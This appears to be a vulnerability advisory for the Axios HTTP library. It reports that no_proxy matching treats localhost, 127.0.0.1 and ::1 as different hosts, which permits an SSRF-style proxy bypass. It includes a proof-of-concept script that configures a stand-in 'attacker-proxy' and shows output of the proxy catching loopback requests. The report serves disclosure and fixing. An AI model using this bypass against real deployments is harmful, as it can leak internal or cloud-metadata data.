summary: "Axios: no_proxy bypass via IP alias allows SSRF\nThe fix for no_proxy hostname normalization\
  \ bypass (#10661) is incomplete.When no_proxy=localhost is set, requests to 127.0.0.1 and\
  \ [::1] still route through the proxy instead of bypassing it.\n\nThe shouldBypassProxy()\
  \ function does pure string matching — it does not \nresolve IP aliases or loopback equivalents.\
  \ As a result:\n- no_proxy=localhost does NOT block 127.0.0.1 or [::1]\n- no_proxy=127.0.0.1\
  \ does NOT block localhost or [::1]\n\n\nPOC :\nprocess.env.no_proxy = 'localhost';\nprocess.env.http_proxy\
  \ = 'http://attacker-proxy:8888';\n\n```(base) srisowmyanemani@Srisowmyas-MacBook-Pro axios\
  \ % >....                     \n    process.env.http_proxy = 'http://127.0.0.1:8888';\n\n\
  \    console.log('=== Test 1: localhost (should bypass proxy) ===');\n    try {\n      await\
  \ axios.get('http://localhost:7777/');\n    } catch(e) {\n      console.log('Error:', e.message);\n\
  \    }\n\n    console.log('');\n    console.log('=== Test 2: 127.0.0.1 (should ALSO bypass\
  \ proxy but DOES NOT) ===');\n    try {\n      await axios.get('http://127.0.0.1:7777/');\n\
  \    } catch(e) {\n      console.log('Error:', e.message);\n    }\n\n    fakeProxy.close();\n\
  \    internalServer.close();\n  });\n});\nEOF\n=== Test 1: localhost (should bypass proxy)\
  \ ===\n✅ Internal server hit directly (correct)\n\n=== Test 2: 127.0.0.1 (should ALSO bypass\
  \ proxy but DOES NOT) ===\n\U0001F6A8 PROXY RECEIVED REQUEST TO: http://127.0.0.1:7777/\n\U0001F6A8\
  \ Host header: 127.0.0.1:7777. ```\n \n\n\n\n\n\n<img width=\"1212\" height=\"247\" alt=\"\
  image\" src=\"https://github.com/user-attachments/assets/0b07ddc4-507d-4b11-a630-15b94ad2c7e7\"\
  \ />\n\n\n\n\nImpact: In server-side environments where no_proxy is used to prevent requests\
  \ to internal/cloud metadata services (e.g., 169.254.169.254), an attacker who can influence\
  \ the URL can bypass the restriction by using an IP alias instead of the hostname, routing\
  \ the request through an attacker-controlled proxy and leaking internal data.\n\nFix: shouldBypassProxy()\
  \ should resolve loopback aliases — localhost, 127.0.0.1, and ::1 should all be treated as\
  \ equivalent."
